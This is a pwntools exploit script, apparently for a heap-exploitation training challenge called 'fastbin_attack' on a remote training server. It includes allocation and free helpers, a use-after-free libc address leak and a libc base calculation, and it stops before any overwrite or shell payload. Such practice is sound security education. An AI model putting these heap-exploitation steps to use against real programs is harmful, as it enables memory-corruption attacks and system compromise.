from pwn import *
import time
from socket import htonl

LIBC = ELF("./libc-2.23.so")

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./fastbin_attack")
    gdb.attach(r, """
    c
    """)

    #input("wait")
else:
    r = remote("bin.training.offdef.it", 2011)

r.recvuntil(b"> ")
print("waited the first menu")

#INTERACTION PRIMITIVES 
def alloc(size):
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(bytes(str(size), 'ascii'))
    print(r.recvline())
    r.recvuntil(b"> ")

def free(index):
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(bytes(str(index), 'ascii'))
    r.recvuntil(b"> ")

def read(index):
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(bytes(str(index), 'ascii'))
    result = r.recvline()
    r.recvuntil(b"> ")
    return result

def write(index, toWrite):
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(bytes(str(index), 'ascii'))
    r.recvuntil(b"Content: ")
    r.sendline(toWrite)
    r.recvuntil(b"> ")



alloc(0x100)    #index 0
alloc(0x40)     #index 1
free(0)
#input("wait")
#leaked_libc = b"\x00\x00" + read(0)
leaked_libc = int.from_bytes(read(0), byteorder = 'little')
 
#print(leaked_libc)

alloc(0x70)     #index 2
alloc(0x70)     #index 3


free(2)
free(3)     


LIBC_OFF = 0x7f053b7c4b78 - 0x7f053b5c0000
libc_base = leaked_libc - LIBC_OFF
print(LIBC_OFF)
print("base: %#x" %libc_base)
LIBC.symbols


r.interactive()